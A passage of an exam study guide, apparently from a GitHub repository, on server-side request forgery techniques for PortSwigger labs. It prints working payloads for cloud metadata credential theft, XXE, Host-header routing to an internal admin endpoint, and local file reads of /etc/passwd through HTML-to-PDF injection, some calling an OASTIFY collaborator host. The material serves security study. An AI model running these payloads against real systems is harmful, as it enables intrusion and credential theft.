SSRF via flawed request parsing\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSSRF redirect_uris\u003c/h3\u003e\u003ca id=\"user-content-ssrf-redirect_uris\" class=\"anchor\" aria-label=\"Permalink: SSRF redirect_uris\" href=\"#ssrf-redirect_uris\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn this Server Side Request a Redirect to URI is exploited.\u003cbr\u003e\nPOST request to register data to the client application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary white-list of callback URIs. Observe the redirect_uri.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"POST /reg HTTP/1.1\nHost: oauth-TARGET.web-security-academy.net\nContent-Type: application/json\nContent-Length: 206\n\n{\n\u0026quot;redirect_uris\u0026quot;:[\u0026quot;https://example.com\u0026quot;],\n    \u0026quot;logo_uri\u0026quot; : \u0026quot;https://OASTIFY.COM\u0026quot;,\n\t\u0026quot;logo_uri\u0026quot; : \u0026quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/\u0026quot;\n\t\n}  \"\u003e\u003cpre\u003ePOST /reg HTTP/1.1\nHost: oauth-TARGET.web-security-academy.net\nContent-Type: application/json\nContent-Length: 206\n\n{\n\"redirect_uris\":[\"https://example.com\"],\n    \"logo_uri\" : \"https://OASTIFY.COM\",\n\t\"logo_uri\" : \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/\"\n\t\n}  \u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ssrf_redirect_uris.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ssrf_redirect_uris.png\" alt=\"ssrf_redirect_uris.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration\" rel=\"nofollow\"\u003ePortSwigger Lab: SSRF via OpenID dynamic client registration\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eXXE + SSRF\u003c/h3\u003e\u003ca id=\"user-content-xxe--ssrf\" class=\"anchor\" aria-label=\"Permalink: XXE + SSRF\" href=\"#xxe--ssrf\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eExploiting XXE to perform SSRF attacks using stock check function that obtains sensitive data.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\n  \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY xxe SYSTEM \u0026quot;http://localhost:6566/latest/\u0026quot;\u0026gt; ]\u0026gt;\n  \u0026lt;stockCheck\u0026gt;\n    \u0026lt;productId\u0026gt;\n      \u0026amp;xxe;\n    \u0026lt;/productId\u0026gt;\n    \u0026lt;storeId\u0026gt;\n      1\n    \u0026lt;/storeId\u0026gt;\n  \u0026lt;/stockCheck\u0026gt;  \"\u003e\u003cpre\u003e\u0026lt;?\u003cspan class=\"pl-ent\"\u003exml\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e version\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e1.0\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e encoding\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eUTF-8\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e?\u0026gt;\n  \u0026lt;!\u003cspan class=\"pl-ent\"\u003eDOCTYPE\u003c/span\u003e \u003cspan class=\"pl-e\"\u003etest\u003c/span\u003e [ \u0026lt;!\u003cspan class=\"pl-k\"\u003eENTITY\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003exxe\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e SYSTEM \u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://localhost:6566/latest/\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt; ]\u0026gt;\n  \u0026lt;\u003cspan class=\"pl-ent\"\u003estockCheck\u003c/span\u003e\u0026gt;\n    \u0026lt;\u003cspan class=\"pl-ent\"\u003eproductId\u003c/span\u003e\u0026gt;\n      \u003cspan class=\"pl-c1\"\u003e\u0026amp;xxe;\u003c/span\u003e\n    \u0026lt;/\u003cspan class=\"pl-ent\"\u003eproductId\u003c/span\u003e\u0026gt;\n    \u0026lt;\u003cspan class=\"pl-ent\"\u003estoreId\u003c/span\u003e\u0026gt;\n      1\n    \u0026lt;/\u003cspan class=\"pl-ent\"\u003estoreId\u003c/span\u003e\u0026gt;\n  \u0026lt;/\u003cspan class=\"pl-ent\"\u003estockCheck\u003c/span\u003e\u0026gt;  \u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xxe-ssrf-localhost.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xxe-ssrf-localhost.png\" alt=\"xxe-ssrf-localhost.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting XXE to perform SSRF attacks\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eHOST Routing-based SSRF\u003c/h3\u003e\u003ca id=\"user-content-host-routing-based-ssrf\" class=\"anchor\" aria-label=\"Permalink: HOST Routing-based SSRF\" href=\"#host-routing-based-ssrf\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e routing-based SSRF by altering the \u003cstrong\u003ehost\u003c/strong\u003e header on request and observe the response. Routing-based SSRF via the Host header allow insecure access to a localhost Intranet.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"GET / HTTP/1.1\nHost: 192.168.0.0\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eGET / HTTP/1.1\nHost: 192.168.0.0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/Routing-based-SSRF.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/Routing-based-SSRF.png\" alt=\"Routing-based SSRF\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNote:\u003c/strong\u003e Once access gained to the internal server admin portal, the response indicate the form requires a POST request and CSRF token, so we convert the GET request to POST as below.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"POST /admin/delete HTTP/1.1\nHost: 192.168.0.135\nCookie: session=TmaxWQzsf7jfkn5KyT9V6GmeIV1lV75E\nSec-Ch-Ua: \u0026quot;Not A(Brand\u0026quot;;v=\u0026quot;24\u0026quot;, \u0026quot;Chromium\u0026quot;;v=\u0026quot;110\u0026quot;\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \u0026quot;Linux\u0026quot;\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: https://TARGET.web-security-academy.net/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 53\n\ncsrf=ftU8wSm4rqdQ2iuSZUwSGmDnLidhYjUg\u0026amp;username=carlos\"\u003e\u003cpre\u003ePOST /admin/delete HTTP/1.1\nHost: 192.168.0.135\nCookie: session=TmaxWQzsf7jfkn5KyT9V6GmeIV1lV75E\nSec-Ch-Ua: \"Not A(Brand\";v=\"24\", \"Chromium\";v=\"110\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Linux\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: https://TARGET.web-security-academy.net/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 53\n\ncsrf=ftU8wSm4rqdQ2iuSZUwSGmDnLidhYjUg\u0026amp;username=carlos\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf\" rel=\"nofollow\"\u003ePortSwigger Lab: Routing-based SSRF\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eHTML to PDF\u003c/h3\u003e\u003ca id=\"user-content-html-to-pdf\" class=\"anchor\" aria-label=\"Permalink: HTML to PDF\" href=\"#html-to-pdf\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e a PDF download function and the \u003ccode\u003esource code\u003c/code\u003e uses \u003ccode\u003eJSON.stringify\u003c/code\u003e to create html on download. This HTML-to-PDF framework is vulnerable to SSRF attack. Partial \u003ccode\u003esource code\u003c/code\u003e for JavaScript on the target \u003ccode\u003edownloadReport.js\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"function downloadReport(event, path, param) {\n\nbody: JSON.stringify({\n  [param]: html\n  }\n  )\n  \"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003efunction\u003c/span\u003e \u003cspan class=\"pl-en\"\u003edownloadReport\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eevent\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003epath\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003eparam\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e \u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\n\nbody: \u003cspan class=\"pl-c1\"\u003eJSON\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003estringify\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"pl-kos\"\u003e[\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eparam\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e]\u003c/span\u003e: \u003cspan class=\"pl-s1\"\u003ehtml\u003c/span\u003e\n  \u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u003c/span\u003e\n  \u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNote:\u003c/strong\u003e The \u003ccode\u003e\u0026lt;div\u0026gt;\u003c/code\u003e tag defines a division or a section in an HTML document. The \u003c/p\u003e\u003cdiv dir=\"auto\"\u003e tag is used as a container for HTML elements - which is then styled with CSS. \u003ca href=\"https://youtu.be/5djtMMciBlw\" rel=\"nofollow\"\u003ez3nsh3ll explain HTML DIV demarcation and SPAN different ways to style the elements.\u003c/a\u003e\u003cp dir=\"auto\"\u003e\u003c/p\u003e\n\u003c/div\u003e\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;div\u0026gt;\u0026lt;p\u0026gt;Report Heading by \u0026lt;img src=\u0026quot;https://OASTIFY.COM/test.png\u0026quot;\u0026gt;\u0026lt;/p\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ediv\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ep\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003eReport Heading by \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eimg\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://OASTIFY.COM/test.png\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ep\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIdentify file download HTML-to-PDF convert function on target is vulnerable.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;\n\tdocument.write('\u0026lt;iframe src=file:///etc/passwd\u0026gt;\u0026lt;/iframe\u0026gt;');\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c1\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\n\tdocument.write('\u003cspan class=\"pl-c1\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eiframe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003efile\u003c/span\u003e:\u003cspan class=\"pl-c\"\u003e///etc/passwd\u0026gt;\u0026lt;/iframe\u0026gt;');\u003c/span\u003e\n\u0026lt;/\u003cspan class=\"pl-s1\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eLibraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/daily-swig/ssrf\" rel=\"nofollow\"\u003ePortSwigger Research SSRF\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSample code below can be injected on vulnerable implementation of HTML to PDF converter such as \u003ccode\u003ewkhtmltopdf\u003c/code\u003e to read local file, resulting in \u003ca href=\"http://hassankhanyusufzai.com/SSRF-to-LFI/\" rel=\"nofollow\"\u003eSSRF to Local File Read Exploit in Hassan's blog\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThehackerish showing wkHTMLtoPDF exploitation using \u003ca href=\"https://www.root-me.org/\" rel=\"nofollow\"\u003eroot-me.org - Gemini-Pentest-v1\u003c/a\u003e CTF lab in the video \u003ca href=\"https://youtu.be/Prqt3N5QU2Q?t=345\" rel=\"nofollow\"\u003ePentest SSRF Ep4\u003c/a\u003e by editing the name of the admin profile with HTML content it is then generated server side by including remote or local files.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/root-me-ctf-gemini-pentest-v1.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/root-me-ctf-gemini-pentest-v1.png\" alt=\"root-me ctf Gemini pentest v1\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;html\u0026gt;\n \u0026lt;body\u0026gt;\n  \u0026lt;script\u0026gt;\n   x = new XMLHttpRequest;\n   x.onload = function() {\n    document.write(this.responseText)\n   };\n   x.open(\u0026quot;GET\u0026quot;, \u0026quot;file:///home/carlos/secret\u0026quot;);\n   x.send();\n  \u0026lt;/script\u0026gt;\n \u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehtml\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebody\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n   \u003cspan class=\"pl-s1\"\u003ex\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-k\"\u003enew\u003c/span\u003e \u003cspan class=\"pl-v\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n   \u003cspan class=\"pl-s1\"\u003ex\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003eonload\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-k\"\u003efunction\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e \u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003ewrite\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003ethis\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eresponseText\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\n   \u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n   \u003cspan class=\"pl-s1\"\u003ex\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003eopen\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"GET\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"file:///home/carlos/secret\"\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n   \u003cspan class=\"pl-s1\"\u003ex\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003esend\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n \u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebody\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ehtml\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eJSON POST request body containing the HTMLtoPDF formatted payload to read local file.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-json notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"{\n \u0026quot;tableHtml\u0026quot;:\u0026quot;\u0026lt;div\u0026gt;\u0026lt;p\u0026gt;SSRF in HTMLtoPDF\u0026lt;/p\u0026gt;\u0026lt;iframe src='file:///home/carlos/secret' height='500' width='500'\u0026gt;\u0026quot;\n}\"\u003e\u003cpre\u003e{\n \u003cspan class=\"pl-ent\"\u003e\"tableHtml\"\u003c/span\u003e:\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u0026lt;div\u0026gt;\u0026lt;p\u0026gt;SSRF in HTMLtoPDF\u0026lt;/p\u0026gt;\u0026lt;iframe src='file:///home/carlos/secret' height='500' width='500'\u0026gt;\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/root-me-ctf-wkhtmltopdf0.12.4.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/root-me-ctf-wkhtmltopdf0.12.4.png\" alt=\"root-me ctf wkhtmltopdf 0.12.4\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAbove the display name is injected with \u003ccode\u003eHTML\u003c/code\u003e payload and on export the HTML-to-PDF converter perform SSRF.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe PDF creator: wkhtmltopdf 0.12.5 is known for SSRF vulnerabilities, and in \u003ca href=\"https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf\" rel=\"nofollow\"\u003eHackTricks - Server Side XSS - Dynamic PDF\u003c/a\u003e there is cross site scripting and server side exploits documented.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 